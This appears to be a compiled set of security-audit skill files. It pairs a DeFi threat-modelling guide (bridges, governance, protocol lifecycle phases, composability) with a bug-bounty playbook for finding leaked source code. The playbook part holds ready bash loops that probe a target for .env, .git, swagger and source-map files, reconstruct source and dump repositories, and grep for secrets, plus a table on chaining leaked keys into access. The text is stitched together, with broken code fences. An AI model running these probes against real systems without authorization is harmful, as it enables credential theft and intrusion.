- Exchange rate reflects true underlying value (staked assets + rewards - slashing)
- Total derivative supply * exchange rate <= total underlying staked
- Withdrawal queue processes in fair order (no priority manipulation)
- Validator performance doesn't systematically disadvantage stakers
- Slashing events are reflected in exchange rate before any user can exit at stale rate

**What to look for first:**
1. Exchange rate calculation: who reports rewards/slashing? How often? Can it be manipulated?
2. Withdrawal mechanism: is there a queue? What's the delay? Can it be griefed?
3. Validator selection: who chooses validators? Can a malicious validator be added?
4. Does the derivative token rebase or use shares? How do integrating protocols handle this?
5. What happens if a massive slashing event occurs? Is the loss socialized fairly?

---

### Bridge

**Primary adversaries** (ranked):
1. **Validator/relayer set attacker** — Compromises the threshold of validators/relayers needed to approve cross-chain messages. This is the #1 bridge exploit vector by total value lost.
2. **Message replay attacker** — Replays a valid cross-chain message on a different chain or replays the same message multiple times to mint/unlock tokens repeatedly.
3. **Race condition exploiter** — Exploits timing gaps between source and destination chain finality. Initiates action on source chain, front-runs the relay on destination chain, or exploits reorgs to reverse source chain action after destination chain has already processed it.
4. **Fake message crafter** — Crafts a cross-chain message that passes validation but contains malicious data. Exploits weaknesses in message encoding, proof verification, or chain ID validation.
5. **Compromised admin** — Can change validator set, pause bridge (trapping funds), or upgrade contracts to drain locked funds. Bridge admin keys are the highest-value targets in DeFi.

**Dominant attack patterns:**
- Validator key compromise → forge cross-chain messages → mint unbacked tokens on destination
- Message replay: same message processed twice (missing nonce check or nonce overflow)
- Proof verification bypass: merkle proof or signature check has edge case that passes invalid proofs
- Chain ID confusion: message valid on chain A gets processed on chain B
- Reorg exploitation: deposit confirmed on source chain → relayed to destination → source chain reorgs → deposit reversed but destination tokens already minted

**Critical invariants:**
- Locked tokens on source chain = minted tokens on destination chain (1:1 backing)
- Every cross-chain message is processed exactly once (no replay)
- Message cannot be forged without validator threshold consensus
- Bridge accounting is consistent across chains (no cross-chain double-spend)

**What to look for first:**
1. Validator/relayer trust model: how many validators? What's the threshold? Can they be changed?
2. Message replay protection: is there a nonce? Is it checked correctly? Can it overflow?
3. Proof verification: merkle proof, signature scheme. Are there edge cases?
4. Finality assumptions: does the bridge wait for finality on source chain?
5. What can the admin do? Can they drain locked funds? Change validators instantly?

---

### Governance

**Primary adversaries** (ranked):
1. **Flash loan governance attacker** — Borrows governance tokens via flash loan, votes on a proposal, and returns tokens in the same transaction. Only possible if voting power is measured at current block rather than a snapshot.
2. **Governance capture attacker** — Gradually accumulates voting power (buying tokens, borrowing from lending protocols, receiving delegations) to pass malicious proposals. Patient, multi-block attack with potentially massive payoff.
3. **Proposal spam / griefing attacker** — Submits many proposals to exhaust voter attention, or submits proposals that appear benign but have hidden malicious effects (e.g., "update parameter to X" where X causes insolvency).
4. **Timelock exploitation attacker** — Monitors queued proposals and positions to exploit parameter changes the instant they execute.
5. **Compromised admin/guardian** — Can cancel proposals, pause governance, or execute emergency actions that bypass normal governance flow.

**Dominant attack patterns:**
- Flash loan → vote → return: instant governance control if no snapshot
- Bribe attacks: pay token holders to delegate or vote for malicious proposals (via platforms like Votium)
- Proposal obfuscation: malicious calldata hidden in a seemingly-benign proposal
- Timelock front-running: position before queued proposal executes to profit from parameter changes
- Guardian abuse: emergency powers used to bypass governance for non-emergency purposes

**Critical invariants:**
- Voting power is snapshotted at proposal creation (not measured at vote time)
- Quorum requirements prevent minority capture
- Timelock provides sufficient delay for users to exit before parameter changes take effect
- No single role can bypass governance unilaterally for non-emergency actions
- Proposal calldata matches its description (can be verified on-chain)

**What to look for first:**
1. Voting power: snapshot or current balance? If current, flash loan attack is trivial.
2. Quorum and threshold: are they high enough to prevent capture? What's the token distribution?
3. Timelock: is the delay nonzero? Is it long enough for users to react?
4. What can governance control? List every parameter/action that goes through governance.
5. Emergency powers: who has them? What can they do? Can they drain funds?

# Temporal Threat Dimension

DeFi protocols have a lifecycle, and different threats dominate at different phases. This reference provides per-phase threat intelligence. The skill auto-detects which phases are relevant from code signals and includes the applicable phases in the threat model.

## Phase Detection

Detect which phases are relevant from code patterns found during Step 2 source reading:

| Phase | Include When |
|-------|-------------|
| **Deployment & Initialization** | Always include — every protocol has this phase |
| **Steady State** | Always include — this is the baseline |
| **Market Stress** | Oracle integration exists, OR liquidation logic exists, OR collateral/debt tracking exists, OR any price-dependent calculation |
| **Governance & Upgrade Windows** | Timelock exists, OR governance contract exists, OR proxy pattern (UUPS/transparent/beacon) exists, OR `propose()`/`vote()`/`execute()` functions exist |
| **Deprecation & Wind-down** | V2/migration in contract names or comments, OR `migrate()` function exists, OR deprecated contract references, OR multi-version architecture |

---

## Phase 1: Deployment & Initialization

The most dangerous 24-48 hours. The protocol transitions from code to live system with real money. Attackers actively monitor deployment transactions.

### Threats

**Initialization front-running:**
Attacker watches the mempool for `initialize()` calls and front-runs with malicious parameters. Critical for UUPS proxies where `initialize()` sets the owner. Also applies to pool creation, market listing, and oracle setup.

What to look for: `initialize()` / `init()` functions without access control or without `initializer` modifier. Proxy deployment where `initialize` is called in a separate transaction from deployment. Pool/market creation that can be called by anyone.

**Parameter misconfiguration:**
Protocol deployed with testing parameters still active. DELAY=0 in timelocks, test oracle addresses, overly permissive access control, dev-mode fee settings. The code is correct but the configuration creates the vulnerability.

What to look for: Hardcoded constants that look like test values (0 delays, max uint fees, known test addresses like 0xdead). Constructor/initializer parameters without validation. Default values that are insecure.

**Ownership not transferred:**
Contract deployed with deployer EOA as owner, intended to transfer to multisig, but transfer hasn't happened yet. Creates a window where a single key controls everything.

What to look for: `Ownable` without `transferOwnership()` in deployment scripts. Two-step ownership transfer that hasn't been accepted. Role-based access where roles haven't been granted to the intended addresses.

**Empty-state exploitation:**
Protocols behave differently when empty. First depositor can manipulate share prices (vault inflation), set initial pool prices, or establish initial state that disadvantages subsequent users.

What to look for: `if (totalSupply == 0)` branches. Pool creation with attacker-chosen initial prices/ratios. Vault deposit when totalAssets == 0. Missing minimum initial deposit requirements.

**Deployment ordering bugs:**
Contracts deployed in wrong order, missing approvals between contracts, circular dependencies not resolved, proxy pointing at wrong implementation.

What to look for: Deployment scripts with multiple transactions. Contracts that reference each other (circular setup). Approval chains (token approvals, role grants) that must happen in specific order.


---

## Phase 2: Steady State

Normal operation. This is where the existing adversary types (flash loan, MEV, external user, compromised admin) operate. The standard threat model covers this phase — no additional temporal-specific content needed. The protocol-type threat profiles provide the detailed guidance for this phase.

---

## Phase 3: Market Stress

Protocols that work perfectly in calm markets can break catastrophically during volatility. This phase accounts for some of the largest DeFi losses (LUNA/UST, cascading liquidations during Black Thursday).

### Threats

**Oracle latency under volatility:**
Oracle heartbeat periods (1h for some Chainlink pairs) mean prices can be stale during rapid market moves. Every calculation using that price is wrong for the duration. Borrowers can be liquidated at unfair prices, or worse, cannot be liquidated at all (stale price shows healthy position while real value is underwater).

What to look for: Chainlink `latestRoundData()` calls — what staleness threshold is used? Is it appropriate for the asset's volatility? Is the heartbeat period documented/configured or hardcoded? Is there a deviation threshold check? What happens if `updatedAt` is 0 or in the future?

**Liquidation cascade:**
Position A is liquidated → liquidation dumps collateral on market → price drops further → Position B is liquidated → cycle repeats. The protocol's own liquidation mechanism amplifies the crash. Can cause systemic insolvency.

What to look for: Liquidation mechanism — does it sell collateral on-market (creating price impact)? Is there a circuit breaker? Is liquidation throttled? Can the protocol handle 30%+ collateral price drops in a single block?

**Liquidity evaporation:**
During stress, LPs withdraw liquidity. Swaps have worse slippage. Liquidation bots can't efficiently swap collateral. Bad debt accumulates because liquidations become unprofitable at the gas + slippage cost.

What to look for: Liquidation profitability assumptions — are they valid when liquidity is thin? Does the protocol assume swap paths exist with sufficient depth? Is there a minimum liquidity requirement?

**Correlated asset depeg:**
Protocol assumes USDC = $1, stETH = ETH, wBTC = BTC. During stress, these correlations break. A lending protocol that treats stETH as equivalent to ETH suddenly has undercollateralized positions.

What to look for: Hardcoded price equivalences (1:1 assumptions). Missing oracle for derivative assets (using underlying asset's oracle instead). Collateral factors that don't account for depeg risk.

**Gas price spikes:**
Critical operations (liquidations, rebalancing, oracle updates) become prohibitively expensive. Time-sensitive operations fail to execute. Keepers and bots stop operating because gas cost exceeds profit.

What to look for: Gas-sensitive operations (keeper-dependent flows). Liquidation incentive vs. gas cost assumptions. Operations that must execute within a time window. Are there fallback mechanisms for keeper failure?

**Withdrawal stampede:**
Many users try to withdraw simultaneously. If the protocol has limited liquid reserves (funds deployed in strategies, locked in positions), early withdrawers drain liquidity and late withdrawers are stuck.

What to look for: Withdrawal queues, rate limits. What percentage of TVL is liquid vs. deployed? Can strategies be unwound quickly? Is there a withdrawal fee that increases under stress (to discourage runs)?


---

## Phase 4: Governance & Upgrade Windows

Every governance action or upgrade creates a transient vulnerability window. The transition period between "old state" and "new state" is when exploits happen.

### Threats

**Timelock exploitation window:**
A governance proposal is queued with a known timelock delay. Everyone can see what parameters will change. Attackers position before execution to exploit new parameters immediately. Example: if collateral factor increases, max borrow the instant the timelock executes.

What to look for: Timelock durations — are they long enough for users to react? Can users exit positions before parameter changes take effect? Are there parameters that could be exploited if their pending value is publicly known?

**Upgrade storage collision:**
Proxy upgrade changes storage layout, corrupting existing state. Balances become wrong, ownership changes unexpectedly, access control breaks. The new implementation reads old storage through a different layout.

What to look for: UUPS `_authorizeUpgrade`, transparent proxy patterns. Is there storage gap usage? Are upgrades tested with the actual storage layout? Is there an upgrade validation step?

**Flash loan governance:**
Attacker borrows governance tokens via flash loan, votes, and returns tokens in same transaction. Trivial if voting power is measured at current block. Some protocols are immune (snapshot-based voting), others are not.

What to look for: Voting power source — `balanceOf(msg.sender)` (vulnerable) vs. snapshot at proposal creation block (immune). Can governance tokens be borrowed from lending protocols?

**Governance capture (slow):**
Attacker accumulates voting power over time — buying tokens, receiving delegations, borrowing from Aave. Once threshold is reached, passes malicious proposals. The timelock is the last defense.

What to look for: Token distribution — is voting power concentrated? What's the quorum? Can a well-funded attacker buy enough tokens to pass proposals? Is there a guardian that can veto?

**Migration window:**
Protocol migrates from V1 to V2. During migration, funds are in transit. Approval chains exist between old and new contracts. Users who don't migrate lose access or face degraded conditions. The V1→V2 bridge is an attack target.

What to look for: Migration functions, V1→V2 transfer mechanisms. Do V1 contracts retain fund access? Is there a deadline? Can migration be front-run?


---

## Phase 5: Deprecation & Wind-down

Protocols don't live forever. When maintenance stops, a new class of threats emerges. Include this phase only when there's evidence of version transitions, deprecation markers, or multi-version architecture.

### Threats

**Residual funds in deprecated contracts:**
Old contracts still hold tokens but monitoring/maintenance has stopped. Keepers no longer run. Oracles go stale permanently. Any exploitable path in the old contract becomes a free-money opportunity with zero monitoring.

What to look for: Multi-version architecture. Are old versions still accessible? Do they still hold funds? Is there a forced migration mechanism?

**Abandoned approval chains:**
Users who interacted with V1 still have active token approvals to V1 contracts. If V1 has any exploitable path, those user approvals are a liability — attacker can drain user wallets through the deprecated contract.

What to look for: Does the protocol use `approve()` (unlimited) or `permit()`? Is there a mechanism to revoke approvals during migration? Are users notified?

**Dependent protocol breakage:**
Other protocols that integrate with the deprecated protocol don't know it's deprecated. They continue calling functions that return stale data, empty results, or revert unexpectedly.

What to look for: Does this protocol serve as an oracle or data source for others? Is there a deprecation flag or kill switch that integrators can check?

**Frozen state exploitation:**
When governance stops or admin keys are lost, the protocol is frozen in its last configuration. Market conditions change but parameters can't be updated. Interest rates, collateral factors, oracle parameters all become increasingly stale.

What to look for: What happens if no governance proposal passes for 6 months? Are there parameters that must be periodically updated? Is there an automated fallback?

---

## Writing the Temporal Risk Profile

In the output, include a "Temporal Risk Profile" subsection within Section 2. For each applicable phase:

1. **Name the phase** and state why it's relevant to this protocol
2. **List the specific threats** that apply (not all threats from every phase — only those where the code has the relevant patterns)
3. **Cite the code location** where the temporal risk exists
4. **Assess mitigation**: is the risk mitigated, partially mitigated, or unmitigated?

Keep it concise — 2-4 bullets per applicable phase. Phase 2 (Steady State) is covered by the main threat model, so skip it in the temporal section to avoid duplication.

# Cross-Protocol Composability Threats

DeFi's unique property is composability — protocols interact with other protocols, creating emergent risks that don't exist in isolated analysis. This reference provides a systematic framework for identifying and documenting composability threats.

## External Call Classification

During Step 2 source reading, every external call is already extracted. This enhancement **classifies** each call into the composability threat taxonomy. For each external call found, determine:

1. **Target type**: Oracle, DEX/AMM, Lending pool, Yield protocol, Token, Governance, Bridge, Other
2. **Assumptions about return value**: What does this protocol assume the external call returns? (correct price, exact token amount, success, specific format)
3. **Validation present**: Does the code validate the return? (bounds check, staleness check, zero check, success check)
4. **Mutability of external behavior**: Can the external contract's behavior change without this protocol's consent? (upgradeable proxy? governed parameters?)
5. **Fallback on failure**: What happens if the external call fails? (revert, silent failure, fallback value, try/catch with fail-open?)

---

## Layer 1: Direct Dependency Risks

The protocol directly calls external contracts. These are visible in the code — every `interface` import and external call is a direct dependency.

### Oracle Dependency Chain

The protocol reads prices from an oracle. But that oracle aggregates from sources that can be manipulated.

**Threat**: Protocol → Oracle → underlying source(s). If any source in the chain is manipulable within the protocol's trust assumptions, the oracle is effectively manipulable.

**What to look for:**
- What oracle is used? (Chainlink, Uniswap TWAP, Pyth, custom)
- What's the oracle's aggregation method? (median of N sources, TWAP, VWAP)
- Staleness check: is `updatedAt` validated? What threshold? Is the threshold appropriate for the asset?
- Deviation check: is the returned price bounded against a reference? (e.g., within 5% of previous price)
- Zero/negative check: what happens if oracle returns 0?
- Sequencer uptime check: on L2s, is the sequencer uptime feed checked?
- Fallback oracle: if primary fails, is there a fallback? Is the fallback also validated?
- Can admin change the oracle address? Instantly or through timelock?

### Yield Strategy Dependency

Protocol deposits funds into external yield protocols (Aave, Compound, Yearn, Convex, etc.).

**Threat**: The external protocol holds the actual funds. If it gets exploited, paused, or changes behavior, this protocol's funds are at risk. The strategy is the bridge between "our code" and "their code."

**What to look for:**
- What protocols do strategies deposit into? List each one.
- Is the external protocol upgradeable? By whom? Through what process?
- Can the external protocol pause withdrawals? Under what conditions?
- Does the strategy have emergency withdrawal capability?
- What happens if the strategy reports a loss? How is it socialized?
- Can new strategies be added? By whom? Instantly or through timelock?
- Does the old strategy retain approvals after migration?
- Are there reentrancy risks through the external protocol's callbacks?

### Token Behavior Assumptions

Every `token.transfer()`, `token.transferFrom()`, `token.balanceOf()` call carries implicit assumptions about token behavior.

**Threat**: The code assumes standard ERC20 behavior. Non-standard tokens break these assumptions silently — no revert, just wrong accounting.

**Assumption matrix** (check each for every token the protocol handles):

| Assumption | Standard Tokens | Violating Tokens | Impact if Violated |
|-----------|----------------|-----------------|-------------------|
| Transfer sends exact amount | ERC20 | Fee-on-transfer (USDT with fee, PAXG) | Internal accounting > real balance, protocol becomes insolvent |
| Balance doesn't change without transfer | ERC20 | Rebasing (stETH, AMPL, aTokens) | Accounting drift, share price manipulation |
| Transfer always succeeds (or reverts) | ERC20 | USDT (returns false, no revert) | Silent transfer failure, lost funds |
| No callback on transfer | ERC20 | ERC-777, ERC-1155 | Reentrancy through transfer callback |
| 18 decimals | Most tokens | USDC (6), WBTC (8), GUSD (2) | Math errors, massive over/under-valuation |
| Token can't block specific addresses | Most tokens | USDC, USDT (blacklist), cUSDC | Withdrawal blocked, funds trapped |
| Token can't be paused | Most tokens | USDC, USDT | All protocol operations blocked |
| Token is immutable | Most tokens | Upgradeable tokens (USDC proxy) | Behavior changes post-deployment without consent |
| No max supply cap affecting mint | Most tokens | Some algorithmic tokens | Deposit credited but tokens never arrive |

**What to look for:**
- Does the code use `balanceOf(before) - balanceOf(after)` pattern? (handles fee-on-transfer)
- Does the code use SafeERC20? (handles non-reverting tokens)
- Are token decimals dynamic or hardcoded?
- Does the code handle rebasing token balance changes?
- Is there a token whitelist, or can arbitrary tokens be used?

### Callback Reentrancy

External calls can trigger callbacks that re-enter the protocol before state is finalized.

**Threat**: Even with reentrancy guards on direct calls, callbacks through external protocols can bypass them. Token transfer → external protocol callback → re-enter through a different function.

**What to look for:**
- State changes after external calls (violating checks-effects-interactions)
- Reentrancy guards: are they per-function or global? Per-function guards don't protect cross-function reentrancy
- ERC-777 tokens: `tokensReceived` hook fires on transfer
- ERC-1155 tokens: `onERC1155Received` fires on transfer
- Aave/Compound flash loan callbacks
- Uniswap swap callbacks
- Vault deposit/withdraw that triggers strategy interaction which triggers external callback

---

## Layer 2: Shared State Risks

Two or more protocols interact with the same underlying state, creating indirect dependencies that are invisible in isolated code review.

### Liquidity Coupling

**Threat**: Protocol A and Protocol B both use the same Uniswap pool for swaps or pricing. A large action in Protocol A moves the pool price, affecting Protocol B's calculations within the same block.

**What to look for:**
- Does the protocol swap through public pools? Which ones?
- Do those pools have significant TVL relative to the protocol's swap sizes?
- Could a large liquidation in this protocol move a pool price enough to affect other protocols?
- Is the protocol itself a significant LP in pools that other protocols use?

**Example**: Protocol uses Uniswap ETH/USDC pool for liquidation swaps. Large liquidation dumps ETH into the pool, cratering the pool price. Another lending protocol uses the same pool's spot price as an oracle. Cascade.

### Oracle Sharing

**Threat**: Multiple protocols use the same oracle feed. A market event triggers liquidations across all of them simultaneously, creating correlated selling pressure and oracle feedback loops.

**What to look for:**
- Which oracle feeds does this protocol use?
- Are these the same feeds used by major lending/derivatives protocols?
- Could liquidations in this protocol create sell pressure that affects the oracle price?
- Could liquidations triggered by the oracle price in *other* protocols create sell pressure that triggers liquidations *here*?

### Approval Chain Exposure

**Threat**: Users grant token approvals to protocol contracts. If any approved contract has an exploitable path, user funds are at risk even if users never interact with the vulnerable function.

**What to look for:**
- Does the protocol request unlimited approvals? (`type(uint256).max`)
- Are approvals scoped to specific functions or broad?
- If the protocol is upgradeable, an upgrade could add a function that drains approved tokens
- Are there deprecated contracts that still hold user approvals?

---

## Layer 3: Temporal Composability Risks

External protocols change over time. This protocol's assumptions about them can silently become invalid.

### Governance-Induced Behavior Change

**Threat**: An external protocol's governance changes a parameter that this protocol's logic depends on. No contract interaction changed, but economic assumptions broke.

**What to look for:**
- Does this protocol assume specific parameter values from external protocols? (interest rates, collateral factors, fee tiers)
- Are external protocol parameters read dynamically or hardcoded?
- Would an external parameter change require this protocol to update its own parameters?

**Example**: Aave governance changes ETH collateral factor from 80% to 75%. A vault strategy that assumes 80% leverage ratio is now over-leveraged and at liquidation risk.

### Upgrade-Induced Interface Change

**Threat**: External protocol upgrades its implementation. Function signatures are the same, but behavior changes (gas cost, revert conditions, return values, side effects).

**What to look for:**
- Are external dependencies behind upgradeable proxies?
- Does this protocol's error handling account for behavior changes? (try/catch that assumes specific revert reasons)
- Are gas estimates hardcoded that could break if external protocol's gas usage changes?

### Deprecation Without Notification

**Threat**: External protocol deprecates an oracle feed, a pool, or an endpoint. The call doesn't revert — it returns stale/wrong data silently. Or it starts reverting, and this protocol's try/catch falls through to an unsafe default.

**What to look for:**
- Are there freshness checks on all external data sources?
- What's the try/catch fallback behavior? Does it fail-open (use stale data) or fail-closed (revert)?
- Is there monitoring for external dependency health?

### Dependency-of-Dependency Upgrade

**Threat**: This protocol uses Protocol A, which uses Protocol B. Protocol B upgrades. Protocol A's behavior changes. This protocol's behavior changes. No visibility into the root cause.

**What to look for:**
- Map the full dependency chain (2-3 levels deep). For each level:
  - Is it upgradeable?
  - Is it governed?
  - Can its behavior change without this protocol's knowledge?
- The deeper the chain, the less control this protocol has. Flag chains deeper than 2 levels.

---


### From `hunt-skills/hunt-source-leak/SKILL.md`

## Crown Jewel Targets

Source map exposing TypeScript source = see all API routes, auth logic, secrets. Swagger/OpenAPI JSON = complete API surface map.

**Highest-value findings:**
- **`.js.map` source maps** — reconstruct full TypeScript/ES6 source code → find hardcoded API keys, internal endpoints, auth logic bypasses
- **`swagger.json` / `openapi.json`** — complete REST API specification with all endpoints, parameters, auth schemes, and internal route names
- **`.env` / `.env.production`** — APP_KEY, DB_PASSWORD, API_KEY, SECRET_KEY in plaintext
- **`.git/` exposure** — `git clone` the entire source history → all past hardcoded secrets
- **`asset-manifest.json` / `_next/static/`** — all JS bundle paths → systematic source map discovery
- **`build-info` / `info.json`** — git commit hash, build timestamp, dependency versions → CVE targeting

---

# These 10 requests take <30 seconds and often yield Critical findings
for PATH in \
  "/.env" \
  "/.env.production" \
  "/.env.local" \
  "/.git/HEAD" \
  "/swagger.json" \
  "/api/swagger.json" \
  "/v1/swagger.json" \
  "/openapi.json" \
  "/api/openapi.json" \
  "/api-docs"; do
  STATUS=$(curl -s -o /tmp/sl_test -w "%{http_code}" "https://$TARGET$PATH")
  if [ "$STATUS" = "200" ]; then
    echo "[+] HIT: https://$TARGET$PATH"
    head -5 /tmp/sl_test
    echo "---"
  fi
done
```

---

## Phase 2 — Source Map Discovery

> **Always resolve the CURRENT build hash before testing, and again before
> re-verifying.** Bundle filenames are content-hashed, so they rotate on every
> deploy. A `.map` URL recorded yesterday can 404 today while the map is still
> fully exposed under a new name. **A 404 at the old URL is not remediation** —
> it is a new build.
>
> ```bash
> # ALWAYS derive the hash live, never reuse a recorded URL
> HASH=$(curl -s "https://$TARGET/" | grep -oE 'main\.[a-f0-9]+\.js' | head -1)
> curl -s -o /dev/null -w '%{http_code} %{size_download} %{content_type}\n' \
>   "https://$TARGET/static/js/${HASH}.map"
> ```
>
> **Lesson from an authorized engagement.** A large production map was found at
> `main.<hashA>.js.map`. On re-verification that URL returned a small HTML
> soft-404 and the finding was nearly closed as fixed. The bundle had rotated to
> `main.<hashB>.js` — and the map was still published at `main.<hashB>.js.map`,
> same size. Nothing had been remediated.
>
> Tell the client this explicitly in the report: **redeploying does not fix source
> map exposure.** Only `GENERATE_SOURCEMAP=false` (or stripping `.map` at deploy)
> plus a CDN purge closes it. A team that redeploys and re-checks the old link
> will wrongly declare victory.
>
> Same rule applies to any content-hashed artifact: chunk files, CSS maps,
> `asset-manifest.json`, and staging equivalents.

```bash

# Step 1: Get asset manifest to find all JS bundle paths
curl -s "https://$TARGET/asset-manifest.json" | python3 -m json.tool 2>/dev/null
curl -s "https://$TARGET/static/js/main.*.js" 2>/dev/null | head -3

# Next.js
BUILD_ID=$(curl -s https://$TARGET/ | grep -oP '"buildId":"\K[^"]+')
curl -s "https://$TARGET/_next/static/$BUILD_ID/_buildManifest.js" | head -5

# Step 2: For each JS bundle, check for source map reference at end of file
for JS_URL in $(curl -s https://$TARGET/ | grep -oP 'src="[^"]*\.js"' | sed 's/src="//;s/"//'); do
  LAST_LINE=$(curl -s "https://$TARGET$JS_URL" | tail -1)
  echo "$LAST_LINE" | grep -q "sourceMappingURL" && echo "[+] Source map: $JS_URL"
done

# Step 3: Download and reconstruct source from .map files
JS_URL="https://$TARGET/static/js/main.abc123.js"
MAP_URL="${JS_URL}.map"
curl -s "$MAP_URL" | python3 -c "
import sys, json, os
data = json.load(sys.stdin)
sources = data.get('sources', [])
contents = data.get('sourcesContent', [])
for i, (src, content) in enumerate(zip(sources, contents)):
    if content:
        path = '/tmp/sourcemap_extract/' + src.replace('../','').replace('./',''). replace('webpack://','')
        os.makedirs(os.path.dirname(path), exist_ok=True)
        with open(path, 'w') as f:
            f.write(content)
        print(f'[+] Extracted: {src}')
"

# Step 4: Grep extracted source for secrets
grep -r "API_KEY\|SECRET\|PASSWORD\|TOKEN\|PRIVATE" /tmp/sourcemap_extract/ 2>/dev/null
grep -r "process\.env\." /tmp/sourcemap_extract/ 2>/dev/null | grep -v "NEXT_PUBLIC_" | head -20
grep -r "http://internal\|localhost\|127\.0\.0\.1\|10\.\|172\.\|192\.168" /tmp/sourcemap_extract/ 2>/dev/null | head -20
```

---

# Common paths
SWAGGER_PATHS=(
  "/swagger.json" "/swagger.yaml" "/swagger/"
  "/api/swagger.json" "/api/swagger.yaml"
  "/v1/swagger.json" "/v2/swagger.json" "/v3/swagger.json"
  "/openapi.json" "/openapi.yaml"
  "/api/openapi.json" "/api-docs" "/api-docs.json"
  "/api/v1/swagger.json" "/api/v2/swagger.json"
  "/rest/swagger.json" "/rest/api-docs"
  "/.well-known/openapi.json"
  "/graphql/schema.json"
)

for PATH in "${SWAGGER_PATHS[@]}"; do
  STATUS=$(curl -s -o /tmp/swagger_test -w "%{http_code}" "https://$TARGET$PATH")
  if [ "$STATUS" = "200" ]; then
    echo "[+] Found: https://$TARGET$PATH"
    # Extract all API paths from swagger
    python3 -c "
import sys, json
try:
    d = json.load(open('/tmp/swagger_test'))
    paths = list(d.get('paths', {}).keys())
    print(f'Endpoints: {len(paths)}')
    print('\n'.join(sorted(paths)))
except: pass
" | head -50
  fi
done
```

---

# Check if .git directory is accessible
curl -s "https://$TARGET/.git/HEAD" | grep -q "ref:" && echo "[+] .git exposed!"

# Tool: git-dumper
pip3 install git-dumper
git-dumper "https://$TARGET/.git/" /tmp/dumped-repo/

# Grep for secrets in all git history
cd /tmp/dumped-repo && \
  git log --all --oneline 2>/dev/null | head -20
  git grep -i "password\|secret\|api_key\|token" $(git rev-list --all) 2>/dev/null | head -30

# trufflehog on git history
trufflehog git file:///tmp/dumped-repo/ 2>/dev/null | head -50
```

---

# Build artifacts and debug files
DEBUG_PATHS=(
  "/build-info.json" "/build/build-info.json"
  "/info" "/actuator/info" "/api/info"
  "/version" "/api/version" "/_version"
  "/health" "/status" "/ping"
  "/robots.txt" "/security.txt" "/.well-known/security.txt"
  "/sitemap.xml" "/manifest.json" "/browserconfig.xml"
  "/crossdomain.xml" "/clientaccesspolicy.xml"
  "/phpinfo.php" "/info.php" "/test.php"
  "/server-status" "/server-info" "/.htaccess"
  "/web.config" "/applicationHost.config"
  "/WEB-INF/web.xml" "/META-INF/MANIFEST.MF"
  "/package.json" "/composer.json" "/Gemfile"
  "/Dockerfile" "/docker-compose.yml" "/.dockerenv"
)

for PATH in "${DEBUG_PATHS[@]}"; do
  STATUS=$(curl -s -o /tmp/debug_test -w "%{http_code}" "https://$TARGET$PATH")
  if [ "$STATUS" = "200" ]; then
    echo "[+] Found: https://$TARGET$PATH ($STATUS, $(wc -c < /tmp/debug_test) bytes)"
    head -3 /tmp/debug_test
    echo "---"
  fi
done
```

---

# .DS_Store files on macOS-deployed web servers reveal directory structure
curl -s "https://$TARGET/.DS_Store" | xxd | head -10

# Parse .DS_Store to extract filenames
pip3 install ds_store
python3 -c "
from ds_store import DSStore
with DSStore.open('/tmp/ds_store_test', 'r') as d:
    for entry in d:
        print(entry.filename)
"

# Tool: https://github.com/lijiejie/ds_store_exp
python3 ds_store_exp.py "https://$TARGET/"
```

---

# Find chunk files
curl -s https://$TARGET/ | grep -oP '"[^"]*\.chunk\.js"' | tr -d '"' | while read chunk; do
  echo "Analyzing: $chunk"
  curl -s "https://$TARGET$chunk" | \
    grep -oE '"(api_key|apiKey|secret|password|token|key)"\s*:\s*"[^"]+"' | head -5
done

# Also grep for internal hostnames
curl -s "https://$TARGET/static/js/main.*.js" | \
  grep -oE '"(https?://[^"]*internal[^"]*|http://[^"]*localhost[^"]*)"' | sort -u

# Check for Base64-encoded secrets
curl -s "https://$TARGET/static/js/main.*.js" | \
  grep -oP '"[A-Za-z0-9+/]{30,}={0,2}"' | while read b64; do
  DECODED=$(echo "$b64" | tr -d '"' | base64 -d 2>/dev/null)
  echo "$DECODED" | grep -iE "key|secret|password|token" && echo "  B64: $b64"
done
```

---

## Chain Table

| Source leak finding | Chain to | Impact |
|--------------------|----------|--------|
| Source map with API key | Use key directly → API access | High/Critical |
| Source map with auth logic | Find auth bypass route | Critical |
| Swagger → internal endpoints | Test undocumented admin routes | High |
| .git exposed | Full source history → all past secrets | Critical |
| build-info with git hash | CVE targeting exact version | High |
| .env with DB_PASSWORD | Direct database access | Critical |

---

# git-dumper (reconstruct exposed .git)
pip3 install git-dumper
git-dumper "https://target.com/.git/" /tmp/repo/

# sourcemap-explorer (visualize what's in bundles)
npm install -g source-map-explorer
source-map-explorer main.js

## Validation

✅ Source map: reconstructed TypeScript source contains API endpoints or hardcoded secrets
✅ Swagger: JSON contains internal endpoints not visible in UI
✅ .git exposed: git-dumper successfully clones repo, secrets in history
✅ .env exposed: DATABASE_URL, API_KEY, SECRET_KEY visible in plaintext

**Severity:**
- .env with credentials: Critical
- .git with secrets in history: Critical
- Source map with secrets: High
- Swagger with internal routes: Medium-High
- robots.txt only: Informational
